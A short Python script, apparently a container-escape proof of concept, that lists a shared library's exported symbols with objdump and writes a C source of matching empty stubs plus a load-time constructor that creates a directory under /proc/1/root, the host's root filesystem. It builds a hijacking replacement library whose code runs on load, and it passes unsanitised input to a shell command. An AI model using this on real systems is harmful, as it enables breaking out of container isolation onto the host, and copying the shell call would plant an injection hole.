import subprocess
so = input()
exploit = """
void __attribute__((constructor)) EEEEEEEEEEEEEEEE(){
    mkdir("/proc/1/root/ESCAPE");
}
void XXXXX(){}
"""

black = []
result = subprocess.check_output(f"objdump -T {so}", shell=True).decode()[:-1]
result = result.split("\n")
symbol = set()
for line in result:
    sym = line.split(' ')[-1]
    if sym in black or sym.startswith("_") or sym.startswith("sys"):
        continue
    if ".text" in line:
        fake_sym = "void " + sym + "(){};\n"
        symbol.add(fake_sym)
    elif ".data" in line or ".bss" in line:
        fake_sym = "int " + sym + ";"
        symbol.add(fake_sym)

fp = open("symbol.c", "w")
for s in symbol:
    fp.write(s)
fp.write(exploit)

fp.close()
